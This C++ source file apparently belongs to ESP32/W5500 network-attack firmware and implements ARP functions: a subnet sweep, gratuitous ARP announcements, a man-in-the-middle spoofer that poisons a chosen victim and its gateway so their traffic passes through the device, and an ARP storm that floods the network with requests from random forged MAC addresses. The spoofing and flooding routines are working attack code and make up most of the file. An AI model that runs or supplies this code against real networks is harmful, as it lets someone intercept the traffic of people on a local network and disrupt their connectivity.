#include "arp_tool.h"
#include "../include/config.h"
#include "net_util.h"
#include "weblog.h"
#include <esp_random.h>
#include <string.h>

#define Serial Out

static const uint8_t BCAST[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
static const uint8_t ZERO[6]  = { 0, 0, 0, 0, 0, 0 };

// Build an ARP frame. oper: 1 = request, 2 = reply. Returns frame length (60).
static uint16_t buildArp(uint8_t *f, const uint8_t da[6], const uint8_t sha[6],
                         uint32_t spa, const uint8_t tha[6], uint32_t tpa, uint16_t oper)
{
    memset(f, 0, 60);
    memcpy(f, da, 6);
    memcpy(f + 6, sha, 6);
    put16(f + 12, ETHERTYPE_ARP);
    uint8_t *a = f + 14;
    put16(a + 0, 1);             // htype = Ethernet
    put16(a + 2, 0x0800);        // ptype = IPv4
    a[4] = 6; a[5] = 4;          // hlen, plen
    put16(a + 6, oper);
    memcpy(a + 8, sha, 6);  put32(a + 14, spa);
    memcpy(a + 18, tha, 6); put32(a + 24, tpa);
    return 60;
}

uint32_t arpScan(W5500Raw &eth, const uint8_t src[6], uint32_t srcIp,
                 uint32_t startIp, uint32_t endIp)
{
    char a[16], b[16];
    ipToStr(startIp, a); ipToStr(endIp, b);
    Serial.printf("\r\nARP sweep %s - %s ...\r\n", a, b);
    if (endIp < startIp || (endIp - startIp) > 4096) {
        Serial.println("Range too large or invalid (max 4096 hosts).");
        return 0;
    }

    uint8_t f[60];
    for (uint32_t ip = startIp; ip <= endIp; ip++) {
        buildArp(f, BCAST, src, srcIp, ZERO, ip, 1);
        eth.sendFrame(f, 60);
        if ((ip & 0x1F) == 0) delay(2);   // pace to avoid TX overrun
        if (ip == endIp) break;
    }

    // Collect replies for a short window.
    static uint8_t buf[ETH_MAX_LEN + 4];
    uint32_t deadline = millis() + 1500;
    uint32_t found = 0;
    while ((int32_t)(deadline - millis()) > 0) {
        uint16_t len = eth.recvFrame(buf, sizeof(buf));
        if (len >= 42 && get16(buf + 12) == ETHERTYPE_ARP && get16(buf + 20) == 2) {
            uint32_t spa = get32(buf + 28);
            if (spa >= startIp && spa <= endIp) {
                char ips[16]; ipToStr(spa, ips);
                Serial.printf("  %-15s  %02X:%02X:%02X:%02X:%02X:%02X\r\n", ips,
                              buf[22], buf[23], buf[24], buf[25], buf[26], buf[27]);
                found++;
            }
        }
        delay(1);
    }
    Serial.printf("ARP sweep complete: %lu host(s) responded.\r\n", (unsigned long)found);
    return found;
}

void arpGratuitous(W5500Raw &eth, const uint8_t src[6], uint32_t ip, uint32_t count)
{
    if (count == 0) count = 5;
    char ips[16]; ipToStr(ip, ips);
    Serial.printf("\r\nGratuitous ARP: %s is-at %02X:%02X:%02X:%02X:%02X:%02X  x%lu\r\n",
                  ips, src[0], src[1], src[2], src[3], src[4], src[5], (unsigned long)count);
    uint8_t f[60];
    buildArp(f, BCAST, src, ip, BCAST, ip, 2);   // reply, tpa==spa
    for (uint32_t i = 0; i < count; i++) { eth.sendFrame(f, 60); delay(200); }
    Serial.println("Sent. Neighbours that accept it now route this IP to us.");
}

void arpSpoof(W5500Raw &eth, IpStack &ip, const uint8_t src[6],
              uint32_t victimIp, uint32_t gatewayIp, uint32_t seconds)
{
    char v[16], g[16]; ipToStr(victimIp, v); ipToStr(gatewayIp, g);
    Serial.printf("\r\nARP spoof MITM: victim %s <-> gateway %s for %lu s\r\n",
                  v, g, (unsigned long)seconds);

    uint8_t victimMac[6], gwMac[6];
    if (!ip.arpResolve(victimIp, victimMac, 1500)) {
        Serial.println("Could not resolve victim MAC. Aborting."); return;
    }
    if (!ip.arpResolve(gatewayIp, gwMac, 1500)) {
        Serial.println("Could not resolve gateway MAC. Aborting."); return;
    }
    Serial.printf("  victim  %02X:%02X:%02X:%02X:%02X:%02X\r\n",
                  victimMac[0],victimMac[1],victimMac[2],victimMac[3],victimMac[4],victimMac[5]);
    Serial.printf("  gateway %02X:%02X:%02X:%02X:%02X:%02X\r\n",
                  gwMac[0],gwMac[1],gwMac[2],gwMac[3],gwMac[4],gwMac[5]);
    Serial.println("Poisoning... (any key stops and re-ARP restores)");

    uint8_t fv[60], fg[60];
    // Tell victim: gatewayIp is-at our MAC
    buildArp(fv, victimMac, src, gatewayIp, victimMac, victimIp, 2);
    // Tell gateway: victimIp is-at our MAC
    buildArp(fg, gwMac, src, victimIp, gwMac, gatewayIp, 2);

    uint32_t deadline = millis() + seconds * 1000UL;
    while ((int32_t)(deadline - millis()) > 0) {
        eth.sendFrame(fv, 60);
        eth.sendFrame(fg, 60);
        for (int i = 0; i < 20 && (int32_t)(deadline - millis()) > 0; i++) {
            if (Serial.available()) { while (Serial.available()) Serial.read();
                deadline = 0; break; }
            delay(100);
        }
    }
    // Restore: re-announce correct bindings to both parties.
    uint8_t r1[60], r2[60];
    buildArp(r1, victimMac, gwMac, gatewayIp, victimMac, victimIp, 2);
    buildArp(r2, gwMac, victimMac, victimIp, gwMac, gatewayIp, 2);
    for (int i = 0; i < 5; i++) { eth.sendFrame(r1, 60); eth.sendFrame(r2, 60); delay(100); }
    Serial.println("Stopped. Correct ARP bindings re-announced.");
}

void arpStorm(W5500Raw &eth, const uint8_t src[6], uint32_t srcIp,
              uint32_t count, uint32_t rateHz)
{
    if (count == 0) count = 10000;
    Serial.printf("\r\nARP storm: %lu request(s)", (unsigned long)count);
    if (rateHz) Serial.printf(" @ ~%lu pps", (unsigned long)rateHz);
    Serial.println(" (any key aborts)...");
    uint32_t interval = rateHz ? (1000000UL / rateHz) : 0;
    uint8_t f[60];
    uint32_t sent = 0, nextUs = micros();
    for (uint32_t i = 0; i < count; i++) {
        uint8_t sha[6];
        uint32_t r = esp_random();
        sha[0] = (r & 0xFE) | 0x02; sha[1] = r >> 8; sha[2] = r >> 16; sha[3] = r >> 24;
        sha[4] = i; sha[5] = i >> 8;
        uint32_t spa = srcIp ? srcIp : esp_random();
        uint32_t tpa = esp_random();
        buildArp(f, BCAST, sha, spa, ZERO, tpa, 1);
        if (eth.sendFrame(f, 60)) sent++;
        if (Serial.available()) { while (Serial.available()) Serial.read(); break; }
        if (interval) { nextUs += interval; while ((int32_t)(micros() - nextUs) < 0) {} }
    }
    Serial.printf("ARP storm done: %lu sent.\r\n", (unsigned long)sent);
}
